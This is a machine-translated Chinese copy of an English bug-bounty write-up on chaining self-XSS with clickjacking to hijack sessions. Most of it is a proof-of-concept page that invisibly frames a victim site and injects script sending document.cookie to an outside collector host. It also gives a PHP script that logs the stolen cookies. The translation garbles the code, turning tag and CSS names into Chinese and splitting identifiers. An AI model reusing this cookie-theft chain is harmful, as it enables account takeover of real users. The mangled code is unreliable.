<html>
<head>
<title>Chaining Self XSS with UI Redressing is Leading to Session Hijacking (PWN users like a boss)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">将自己的XSS与UI调整链接在一起会导致会话劫持(PWN用户就像老板一样)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14?source=collection_archive---------2-----------------------#2017-09-18">https://infosecwriteups.com/chaining-self-xss-with-ui-redressing-is-leading-to-session-hijacking-pwn-users-like-a-boss-efb46249cd14?source=collection_archive---------2-----------------------#2017-09-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="1c3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我测试web应用程序时，我发现了自己的xss。这没有任何影响。但我想利用这个漏洞，所以我开始思考如何利用这个自我xss，然后我决定将这个自我xss与其他一些漏洞联系起来。</p><p id="69b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">于是又一次盯着找CSRF进攻，而我却一力把CSRF弄到了脆弱的一页。</p><p id="2427" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我注意到应用程序没有使用x帧头。所以想让我们检查点击劫持。！<br/>耶！应用程序易受点击劫持的攻击。</p><p id="9d0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以决定用点击劫持来连锁自己的xss。</p><p id="133b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里是点击劫持，这是与自己的xss抓取受害者的饼干连锁。</p><p id="ac98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"> <br/> &lt;头&gt; &lt;名头&gt;Poc&lt;/名头&gt; <br/> &lt;身bgcolor = " gray "&gt;<br/>&lt;h1 align = " center "&gt;拖N坠游戏&lt;/h1&gt;<br/>&lt;br&gt;br&gt;&lt;br&gt;<br/>&lt;img src = "<a class="ae kl" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSi0I3s6J4VZohcVZbzUzJ-g-y722W8jqyo4g1lc0HhM9SH9WN9" rel="noopener ugc nofollow" target="_blank">https://encrypted-tbn0.gstatic.com/images?q = tbn:and 9 gcsi 0 i3 s6j 4 vzohcvzbzuzj-g-y 722 w8 jqyo 4g 1 LC 0 hhm 9 sh 9 wn 9</a>" draggable = true id = drag ondragstart = " event . data transfer . setdata(' text/plain '，'&lt;script&gt;location = `<a class="ae kl" href="http://armaanpathan.pe.hu/cookies.php?cookie=`+btoa(document.cookie)" rel="noopener ugc nofollow" target="_blank">http://armaanpathan.pe.hu/cookies.php?cookie = `+btoa(document . cookie)</a>&lt;/script&gt;')"&gt;</p><p id="da00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><br/><br/><br/><br/>&lt;style type = " text/CSS "&gt;<br/>iframe {<br/>width:800 px；<br/>高度:650px<br/>位置:绝对；<br/>top:2；右:10；<br/>滤镜:alpha(不透明度= 50)；<br/>不透明度:0.00；</p><p id="a95d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><br/>&lt;style type = " text/CSS "&gt;<br/>H2 {<br/>位置:绝对；<br/>顶:420；右:30；<br/>}<br/>&lt;/style&gt;<br/>&lt;iframe src = " www . victim . com "&gt;&lt;/iframe&gt;<br/>&lt;H2&gt;拖动图片到这里&lt;/H2&gt;<br/>&lt;/html&gt;</p><p id="5f16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是将抓取的cookies保存在txt文件中的代码</p><p id="9672" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><?php </root?></p><p id="6f0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">$c=$_GET[‘cookie’];<br/>FILE _ put _ contents(" cookies . txt "，$c . "\n\n "，FILE _ APPEND)；</p><p id="3eb3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">?&gt;</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/4f71a3456a2e56b73874fe5ace9c60b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vXmIAewQ5VBEyBhfWp8rwg.jpeg"/></div></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/e59ad61e36010fb04c7f6201be5ab129.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l06ygVlwT6spvJc-NXz4Ng.jpeg"/></div></div></figure><p id="678d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我可以劫持任何用户的会话。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ky"><img src="../Images/2c79b1fcc3dd318e2464a8fe15b95df8.png" data-original-src="https://miro.medium.com/v2/resize:fit:500/format:webp/1*tgyPnZb41KH0D9o6cLIv3Q.jpeg"/></div></figure><p id="ce4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是概念验证视频</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="kz la l"/></div></figure><p id="d289" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">空间感谢<a class="ae kl" href="https://twitter.com/iamnoooob" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">拉胡尔·麦尼</strong> </a> <strong class="jp ir">。谢谢你帮助我。:)</strong></p><p id="5272" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。:)</p></div></div>    
</body>
</html>